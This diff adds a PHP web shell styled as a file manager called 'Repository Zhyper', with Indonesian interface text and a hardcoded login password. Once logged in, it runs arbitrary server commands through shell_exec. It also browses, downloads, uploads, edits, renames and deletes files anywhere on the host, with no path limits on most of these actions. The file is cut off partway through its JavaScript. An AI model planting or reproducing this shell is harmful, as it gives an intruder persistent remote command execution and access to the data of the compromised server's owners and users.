@@ -1,0 +1,932 @@
+<?php
+session_start();
+set_time_limit(0);
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Security: Use a hashed password for better security (in production, use proper hashing)
+$kataSandiBenar = 'abcinta10'; // Consider using password_hash() in future
+
+// Function to sanitize input
+function sanitizeInput($input) {
+    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
+}
+
+// Function to validate file name
+function validateFileName($name) {
+    return preg_match('/^[a-zA-Z0-9_\-\.\s]+$/', $name);
+}
+
+// Function to check if path is within base directory (prevent path traversal)
+function isPathSafe($path, $baseDir) {
+    $realPath = realpath($path);
+    $realBase = realpath($baseDir);
+    return $realPath && strpos($realPath, $realBase) === 0;
+}
+
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        $password = sanitizeInput($_POST['password']);
+        if ($password === $kataSandiBenar) {
+            $_SESSION['authenticated'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = 'Kata sandi salah. Coba lagi!';
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Masuk - Repository Zhyper</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+        <style>
+            body {
+                background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
+                color: #fff;
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                overflow: hidden;
+            }
+            .login-container {
+                background: rgba(255, 255, 255, 0.1);
+                backdrop-filter: blur(10px);
+                border-radius: 20px;
+                padding: 40px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+                animation: fadeInUp 0.8s ease-out;
+            }
+            @keyframes fadeInUp {
+                from { opacity: 0; transform: translateY(30px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+            .btn-login {
+                background: linear-gradient(45deg, #007bff, #0056b3);
+                border: none;
+                border-radius: 25px;
+                padding: 12px 30px;
+                transition: all 0.3s ease;
+            }
+            .btn-login:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 5px 15px rgba(0, 123, 255, 0.4);
+            }
+            .form-control {
+                background: rgba(255, 255, 255, 0.1);
+                border: 1px solid rgba(255, 255, 255, 0.2);
+                border-radius: 10px;
+                color: #fff;
+            }
+            .form-control:focus {
+                background: rgba(255, 255, 255, 0.2);
+                border-color: #007bff;
+                box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+            }
+            .alert {
+                border-radius: 10px;
+                animation: shake 0.5s ease-in-out;
+            }
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                25% { transform: translateX(-5px); }
+                75% { transform: translateX(5px); }
+            }
+        </style>
+    </head>
+    <body class="d-flex justify-content-center align-items-center vh-100">
+        <div class="container text-center">
+            <div class="login-container">
+                <i class="fas fa-lock fa-3x mb-4 text-primary"></i>
+                <h1 class="mb-4">Masuk ke Repository Zhyper</h1>
+                <?php if (isset($error)) { echo "<div class='alert alert-danger'><i class='fas fa-exclamation-triangle me-2'></i>$error</div>"; } ?>
+                <form method="POST">
+                    <div class="mb-3">
+                        <div class="input-group">
+                            <span class="input-group-text bg-transparent border-0"><i class="fas fa-key text-primary"></i></span>
+                            <input type="password" name="password" class="form-control" placeholder="Kata Sandi" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-login btn-lg"><i class="fas fa-sign-in-alt me-2"></i>Masuk</button>
+                </form>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+$baseDir = realpath(getcwd());
+$path = isset($_GET['path']) ? realpath($_GET['path']) : $baseDir;
+
+if ($path === false || !is_dir($path)) {
+    $path = $baseDir;
+}
+if ($path === false || !is_dir($path)) {
+    echo "<tr><td colspan='4'>Direktori tidak valid atau tidak ditemukan.</td></tr>";
+    $folders = [];
+    $files = [];
+} else {
+    $folders = [];
+    $files = [];
+    $scandir = scandir($path);
+    foreach ($scandir as $item) {
+        $fullpath = "$path/$item";
+        if (is_dir($fullpath) && $item != '.' && $item != '..') {
+            $folders[] = $item;
+        } elseif (is_file($fullpath)) {
+            $files[] = $item;
+        }
+    }
+}
+
+
+function downloadFile($file)
+{
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    } else {
+        echo "<script>alert('File tidak ditemukan!');</script>";
+    }
+}
+
+function getPermissions($file) {
+    $perms = fileperms($file);
+
+    switch ($perms & 0xF000) {
+        case 0xC000: $info = 's'; break;
+        case 0xA000: $info = 'l'; break;
+        case 0x8000: $info = '-'; break;
+        case 0x6000: $info = 'b'; break;
+        case 0x4000: $info = 'd'; break;
+        case 0x2000: $info = 'c'; break;
+        case 0x1000: $info = 'p'; break;
+        default: $info = 'u';
+    }
+
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+if (isset($_GET['download'])) {
+    downloadFile($_GET['download']);
+}
+
+$cmdResult = null;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    if (is_dir($path)) {
+        chdir($path);
+    }
+    if (is_callable('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
+        $cmdResult = shell_exec($cmd . ' 2>&1');
+        if (empty($cmdResult)) {
+            $cmdResult = "No Output";
+        }
+    } else {
+        $cmdResult = "Not Shell: shell_exec() is disabled on this server.";
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
+    if (isset($_FILES['file'])) {
+        $fileName = basename($_FILES['file']['name']);
+        if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $fileName)) {
+            $targetPath = $path . '/' . $fileName;
+            if (!is_writable($path)) {
+                echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Direktori tidak dapat ditulis. Periksa izin file.</div>";
+            } elseif (file_exists($targetPath)) {
+                echo "<div class='alert alert-warning mt-2' style='max-width: 300px;'>File sudah ada!</div>";
+            } elseif (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
+                echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>File berhasil diupload!</div>";
+            } else {
+                echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal mengupload file. Error: " . $_FILES['file']['error'] . "</div>";
+            }
+        } else {
+            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama file tidak valid!</div>";
+        }
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_file') {
+    if (isset($_POST['name'])) {
+        $fileName = sanitizeInput($_POST['name']);
+        if (validateFileName($fileName)) {
+            $filePath = $path . '/' . $fileName;
+            if (isPathSafe($filePath, $baseDir)) {
+                try {
+                    if (file_put_contents($filePath, "") !== false) {
+                        echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>File berhasil dibuat!</div>";
+                    } else {
+                        echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal membuat file!</div>";
+                    }
+                } catch (Exception $e) {
+                    echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Error: " . $e->getMessage() . "</div>";
+                }
+            } else {
+                echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Path tidak aman!</div>";
+            }
+        } else {
+            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama file tidak valid!</div>";
+        }
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_folder') {
+    if (isset($_POST['name']) && preg_match('/^[a-zA-Z0-9_\-]+$/', $_POST['name'])) {
+        $folderPath = $path . '/' . $_POST['name'];
+        if (mkdir($folderPath)) {
+            echo "<div class='alert alert-success mt-2' style='max-width: 300px;'>Folder berhasil dibuat!</div>";
+        } else {
+            echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Gagal membuat folder!</div>";
+        }
+    } else {
+        echo "<div class='alert alert-danger mt-2' style='max-width: 300px;'>Nama folder tidak valid!</div>";
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'], $_POST['target'])) {
+    $action = $_POST['action'];
+    $targetPath = $_POST['target'];
+
+    switch ($action) {
+            case 'delete':
+                if (is_file($targetPath)) {
+                    if (unlink($targetPath)) {
+                        echo json_encode(['status' => 'success', 'message' => 'File berhasil dihapus!']);
+                    } else {
+                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus file!']);
+                    }
+                } elseif (is_dir($targetPath)) {
+                    if (rmdir($targetPath)) {
+                        echo json_encode(['status' => 'success', 'message' => 'Folder berhasil dihapus!']);
+                    } else {
+                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus folder!']);
+                    }
+                } else {
+                    echo json_encode(['status' => 'error', 'message' => 'Target tidak valid!']);
+                }
+                exit;
+
+            case 'edit':
+                if (isset($_POST['content'])) {
+                    $handle = fopen($targetPath, 'w');
+                    if ($handle) {
+                        fwrite($handle, $_POST['content']);
+                        fclose($handle);
+                        echo json_encode(['status' => 'success', 'message' => 'File berhasil diedit!']);
+                    } else {
+                        echo json_encode(['status' => 'error', 'message' => 'Tidak dapat membuka file untuk menulis!']);
+                    }
+                } else {
+                    if (file_exists($targetPath)) {
+                        $content = file_get_contents($targetPath);
+                        echo json_encode(['status' => 'success', 'content' => $content]);
+                    } else {
+                        echo json_encode(['status' => 'error', 'message' => 'File tidak ditemukan!']);
+                    }
+                }
+                exit;
+
+            case 'rename':
+                if (isset($_POST['new_name'])) {
+                    $newPath = dirname($targetPath) . '/' . $_POST['new_name'];
+                    if (rename($targetPath, $newPath)) {
+                        echo json_encode(['status' => 'success', 'message' => 'Berhasil mengganti nama!']);
+                    } else {
+                        echo json_encode(['status' => 'error', 'message' => 'Gagal mengganti nama!']);
+                    }
+                } else {
+                    echo json_encode(['status' => 'error', 'message' => 'Nama baru tidak diberikan!']);
+                }
+                exit;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Repository Zhyper</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+    body {
+        background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
+        color: #fff !important;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        overflow-x: hidden;
+    }
+
+    .container {
+        max-width: 1200px;
+    }
+
+    .header {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 15px;
+        padding: 20px;
+        margin-bottom: 30px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        animation: slideInDown 0.8s ease-out;
+    }
+
+    @keyframes slideInDown {
+        from { opacity: 0; transform: translateY(-30px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .table {
+        margin: 20px auto;
+        width: 100%;
+        color: #fff !important;
+        border-radius: 10px;
+        overflow: hidden;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .table-striped tbody tr:nth-of-type(odd),
+    .table-striped tbody tr:nth-of-type(even) {
+        background-color: transparent !important;
+        transition: background-color 0.3s ease;
+    }
+
+    .table-striped tbody tr:hover {
+        background-color: rgba(255, 255, 255, 0.1) !important;
+    }
+
+    .table-striped tbody tr td {
+        color: #fff !important;
+        border: none;
+        padding: 15px;
+    }
+
+    .table-dark {
+        background: linear-gradient(45deg, #343a40, #495057) !important;
+        color: #fff !important;
+    }
+
+    .breadcrumb {
+        margin-bottom: 20px;
+        color: #fff !important;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 10px;
+    }
+
+    .btn {
+        margin: 0 5px;
+        color: #fff !important;
+        border-radius: 25px;
+        transition: all 0.3s ease;
+        border: none;
+        padding: 8px 20px;
+    }
+
+    .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn-primary {
+        background: linear-gradient(45deg, #007bff, #0056b3) !important;
+        border-color: #007bff !important;
+    }
+
+    .btn-danger {
+        background: linear-gradient(45deg, #dc3545, #c82333) !important;
+        border-color: #dc3545 !important;
+    }
+
+    .btn-warning {
+        background: linear-gradient(45deg, #ffc107, #e0a800) !important;
+        border-color: #ffc107 !important;
+        color: #000 !important;
+    }
+
+    .btn-success {
+        background: linear-gradient(45deg, #28a745, #218838) !important;
+        border-color: #28a745 !important;
+    }
+
+    .modal-content {
+        background: linear-gradient(135deg, #2c2c2c 0%, #1a1a1a 100%);
+        color: #fff;
+        border-radius: 15px;
+        border: none;
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+    }
+
+    .modal-header {
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .modal textarea {
+        width: 100%;
+        height: 300px;
+        color: #000 !important;
+        background-color: #fff !important;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+    }
+
+    .shell {
+        border-radius: 10px;
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        font-size: 12px;
+        display: flex;
+        flex-direction: column;
+        align-items: stretch;
+        background: linear-gradient(45deg, #242424, #1a1a1a);
+        color: rgb(145, 255, 0);
+        padding: 15px;
+        border-radius: 10px;
+        overflow: auto;
+        white-space: pre-wrap;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        animation: fadeIn 0.5s ease-out;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+
+    .input-group-text {
+        background: linear-gradient(45deg, #000, #333);
+        color: rgb(145, 255, 0);
+        font-size: 12px;
+        padding: 10px 15px;
+        border-radius: 25px 0 0 25px;
+        border: none;
+    }
+
+    .btn-dark {
+        background: linear-gradient(45deg, #000, #333);
+        color: #fff;
+        border-radius: 0 25px 25px 0;
+        border: none;
+        transition: all 0.3s ease;
+    }
+
+    .btn-dark:hover {
+        background: linear-gradient(45deg, #333, #666);
+        transform: translateX(2px);
+    }
+
+    .action-buttons {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        justify-content: center;
+        margin-bottom: 20px;
+    }
+
+    .action-buttons .btn {
+        margin: 0;
+        flex: 1;
+        min-width: 120px;
+    }
+
+    .alert {
+        border-radius: 10px;
+        animation: slideIn 0.5s ease-out;
+    }
+
+    @keyframes slideIn {
+        from { transform: translateX(-100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+
+    .file-link {
+        color: #00d4ff;
+        text-decoration: none;
+        transition: color 0.3s ease;
+    }
+
+    .file-link:hover {
+        color: #0099cc;
+        text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+        .container {
+            padding: 10px;
+        }
+        .table {
+            font-size: 14px;
+        }
+        .action-buttons {
+            flex-direction: column;
+        }
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="text-center mb-4"><i class="fas fa-folder-open me-3"></i>Repository Zhyper</h1>
+
+            <div class="d-flex justify-content-between align-items-center mb-3">
+                <div>
+                    <?php
+                    echo "<p class='mb-2'><strong>Current Directory:</strong> ";
+                    $paths = explode('/', trim($path, '/'));
+                    $currentPath = '';
+
+                    foreach ($paths as $index => $folder) {
+                        $currentPath .= '/' . $folder;
+                        echo "<a href='?path=" . htmlspecialchars($currentPath, ENT_QUOTES, 'UTF-8') . "' class='file-link'>$folder</a>";
+                        if ($index < count($paths) - 1) {
+                            echo " / ";
+                        }
+                    }
+                    echo " <a href='?path=" . htmlspecialchars($baseDir, ENT_QUOTES, 'UTF-8') . "' class='btn btn-sm btn-primary'><i class='fas fa-home me-1'></i>[Home]</a>";
+                    echo "</p>";
+                    ?>
+
+                    <div class="mt-4">
+                        <form method="POST">
+                            <div class="input-group mb-3">
+                                <span class="input-group-text">
+                                    <?php
+                                    $user = get_current_user();
+                                    $host = gethostname();
+                                    echo htmlspecialchars("$user@$host:~$");
+                                    ?>
+                                </span>
+                                <input class="form-control" type="text" name="cmd" placeholder="Masukkan perintah CMD" style="color: rgb(145, 255, 0); background-color: #000;" required>
+                                <button class="btn btn-dark" type="submit"><i class="fas fa-play me-1"></i> Jalankan</button>
+                            </div>
+                        </form>
+
+                        <?php if ($cmdResult !== null) { ?>
+                            <div class="shell">
+                                <pre><?php echo htmlspecialchars($cmdResult, ENT_QUOTES, 'UTF-8'); ?></pre>
+                            </div>
+                        <?php } ?>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <form method="POST" class="d-inline">
+                        <button type="submit" name="show_upload" class="btn btn-success"><i class="fas fa-upload me-1"></i>Upload File</button>
+                    </form>
+                    <form method="POST" class="d-inline">
+                        <button type="submit" name="show_create_file" class="btn btn-primary"><i class="fas fa-file-alt me-1"></i>Buat File</button>
+                    </form>
+                    <form method="POST" class="d-inline">
+                        <button type="submit" name="show_create_folder" class="btn btn-warning"><i class="fas fa-folder-plus me-1"></i>Buat Folder</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <?php
+        // Tampilkan form upload file
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_upload'])) {
+            ?>
+            <form method="POST" enctype="multipart/form-data" class="mb-3">
+                <input type="hidden" name="action" value="upload">
+                <div class="mb-3">
+                    <label for="file" class="form-label">Pilih File</label>
+                    <input type="file" name="file" id="file" class="form-control form-control-sm" required>
+                </div>
+                <button type="submit" class="btn btn-success btn-sm">Upload</button>
+            </form>
+            <?php
+        }
+
+        // Tampilkan form buat file
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_create_file'])) {
+            ?>
+            <form method="POST" class="mb-3">
+                <input type="hidden" name="action" value="create_file">
+                <div class="mb-3">
+                    <label for="fileName" class="form-label">Nama File</label>
+                    <input type="text" name="name" id="fileName" class="form-control form-control-sm" placeholder="Masukkan nama file (contoh: file.txt)" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-sm">Buat</button>
+            </form>
+            <?php
+        }
+
+        // Tampilkan form buat folder
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['show_create_folder'])) {
+            ?>
+            <form method="POST" class="mb-3">
+                <input type="hidden" name="action" value="create_folder">
+                <div class="mb-3">
+                    <label for="folderName" class="form-label">Nama Folder</label>
+                    <input type="text" name="name" id="folderName" class="form-control form-control-sm" placeholder="Masukkan nama folder" required>
+                </div>
+                <button type="submit" class="btn btn-warning btn-sm">Buat</button>
+            </form>
+            <?php
+        }
+        ?>
+
+        <table class="table table-striped">
+            <thead class="table-dark">
+                <tr>
+                    <th>Nama</th>
+                    <th>Ukuran</th>
+                    <th>Izin</th>
+                    <th>Aksi</th>
+                </tr>
+            </thead>
+            <tbody>
+              <?php
+                $parentPath = dirname($path);
+                if ($parentPath && realpath($parentPath) !== realpath($path)) {
+                    echo "<tr>
+                        <td><a href='?path=" . htmlspecialchars($parentPath, ENT_QUOTES, 'UTF-8') . "'>Kembali ke " . basename($parentPath) . "</a></td>
+                        <td>--</td>
+                        <td>--</td>
+                        <td>--</td>
+                    </tr>";
+                }
+                
+               
+                $folders = [];
+                $files = [];
+                $scandir = scandir($path);
+                foreach ($scandir as $item) {
+                    $fullpath = "$path/$item";
+                    if (is_dir($fullpath) && $item != '.' && $item != '..') {
+                        $folders[] = $item;
+                    } elseif (is_file($fullpath)) {
+                        $files[] = $item;
+                    }
+                }
+                
+               
+                foreach ($folders as $folder) {
+                    $fullpath = rtrim($path, '/') . '/' . $folder;
+                    echo "<tr>
+                        <td><i class='fas fa-folder text-warning me-2'></i><a href='?path=" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' class='file-link'>$folder</a></td>
+                        <td>--</td>
+                        <td>" . getPermissions($fullpath) . "</td>
+                        <td>
+                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' data-bs-toggle='tooltip' title='Rename Folder'><i class='fas fa-edit'></i></button>
+                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' data-bs-toggle='tooltip' title='Delete Folder'><i class='fas fa-trash'></i></button>
+                        </td>
+                    </tr>";
+                }
+
+
+                foreach ($files as $file) {
+                    $fullpath = "$path/$file";
+                    $size = round(filesize($fullpath) / 1024, 2) . ' KB';
+                    $fileIcon = 'fas fa-file';
+                    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+                    switch ($ext) {
+                        case 'php': $fileIcon = 'fab fa-php'; break;
+                        case 'html': $fileIcon = 'fab fa-html5'; break;
+                        case 'css': $fileIcon = 'fab fa-css3-alt'; break;
+                        case 'js': $fileIcon = 'fab fa-js-square'; break;
+                        case 'txt': $fileIcon = 'fas fa-file-alt'; break;
+                        case 'jpg': case 'jpeg': case 'png': case 'gif': $fileIcon = 'fas fa-file-image'; break;
+                        case 'pdf': $fileIcon = 'fas fa-file-pdf'; break;
+                        case 'zip': $fileIcon = 'fas fa-file-archive'; break;
+                    }
+                    echo "<tr>
+                        <td><i class='$fileIcon text-info me-2'></i>$file</td>
+                        <td>$size</td>
+                        <td>" . getPermissions($fullpath) . "</td>
+                        <td>
+                            <button class='btn btn-primary btn-sm edit-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' data-bs-toggle='tooltip' title='Edit File'><i class='fas fa-edit'></i></button>
+                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' data-bs-toggle='tooltip' title='Rename File'><i class='fas fa-i-cursor'></i></button>
+                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' data-bs-toggle='tooltip' title='Delete File'><i class='fas fa-trash'></i></button>
+                            <a href='?download=" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "' class='btn btn-success btn-sm' data-bs-toggle='tooltip' title='Download File'><i class='fas fa-download'></i></a>
+                        </td>
+                    </tr>";
+                }
+                
+                ?>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="uploadModalLabel">Upload File</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST" enctype="multipart/form-data" class="mb-3">
+                    <input type="hidden" name="action" value="upload">
+                    <div class="mb-3">
+                        <label for="file" class="form-label">Pilih File</label>
+                        <input type="file" name="file" id="file" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-success">Upload File</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="createFileModalLabel">Buat File Baru</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST" class="mb-3">
+                    <input type="hidden" name="action" value="create_file">
+                    <div class="mb-3">
+                        <label for="fileName" class="form-label">Nama File</label>
+                        <input type="text" name="name" id="fileName" class="form-control" placeholder="Masukkan nama file (contoh: file.txt)" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Buat File</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="createFolderModalLabel">Buat Folder Baru</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <form method="POST" class="mb-3">
+                    <input type="hidden" name="action" value="create_folder">
+                    <div class="mb-3">
+                        <label for="folderName" class="form-label">Nama Folder</label>
+                        <input type="text" name="name" id="folderName" class="form-control" placeholder="Masukkan nama folder" required>
+                    </div>
+                    <button type="submit" class="btn btn-warning">Buat Folder</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="editModalLabel">Edit File</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <textarea id="fileContent" class="form-control" rows="10"></textarea>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
+                    <button type="button" class="btn btn-primary save-changes-btn">Simpan Perubahan</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="renameModalLabel">Ganti Nama</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <input type="text" id="newName" class="form-control" placeholder="Masukkan nama baru">
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
+                <button type="button" class="btn btn-primary save-rename-btn">Simpan</button>
+            </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // Initialize tooltips
+    var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
+    var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+        return new bootstrap.Tooltip(tooltipTriggerEl);
+    });
+
+    function showAlert(message, type) {
+        const alertHtml = `<div class="alert alert-${type} alert-dismissible fade show" role="alert">
+            <i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-triangle'} me-2"></i>
+            ${message}
+            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+        </div>`;
+        $('.container').prepend(alertHtml);
+        setTimeout(() => $('.alert').alert('close'), 3000);
+    }
+
+    $(document).on("click", ".delete-btn", function () {
+        const path = $(this).data("path");
+        const isFolder = $(this).closest('tr').find('td:first-child').text().includes('folder');
+        const itemName = $(this).closest('tr').find('td:first-child').text().replace(/<[^>]*>/g, '').trim();
+        if (confirm(`Apakah Anda yakin ingin menghapus "${itemName}"? Tindakan ini tidak dapat dibatalkan.`)) {
+            $.post("", { action: "delete", target: path }, function (response) {
+                const res = JSON.parse(response);
+                if (res.status === "success") {
+                    showAlert(res.message, 'success');
+                    setTimeout(() => location.reload(), 1500);
+                } else {
+                    showAlert(res.message, 'danger');
+                }
+            });
+        }
+    });
+
+    $(document).on("click", ".edit-btn", function () {
+        const path = $(this).data("path");
+        $.post("", { action: "edit", target: path }, function (response) {
+            const res = JSON.parse(response);
+            if (res.status === "success") {
+                $("#fileContent").val(res.content);
+                $(".save-changes-btn").data("path", path);
+                $("#editModal").modal("show");
+            } else {
+                showAlert(res.message, 'danger');
+            }
+        });
+    });
+
+    $(".save-changes-btn").click(function () {
+        const path = $(this).data("path");
+        const content = $("#fileContent").val();
+        $.post("", { action: "edit", target: path, content: content }, function (response) {
+            const res = JSON.parse(response);
+            if (res.status === "success") {
+                showAlert(res.message, 'success');
+                $("#editModal").modal("hide");
+                setTimeout(() => location.reload(), 1500);
+            } else {
+                showAlert(res.message, 'danger');
+            }
+        });
+    });
+
+    $(document).on("click", ".rename-btn", function () {
+        const path = $(this).data("path");
+        $("#renameModal").modal("show");
+        $(".save-rename-btn").data("path", path);
+    });
+
+    $(".save-rename-btn").click(function () {
+        const path = $(this).data("path");
+        const newName = $("#newName").val();
+        if (newName.trim() === "") {
+            showAlert("Nama baru tidak boleh kosong!", 'warning');
+            return;
+        }
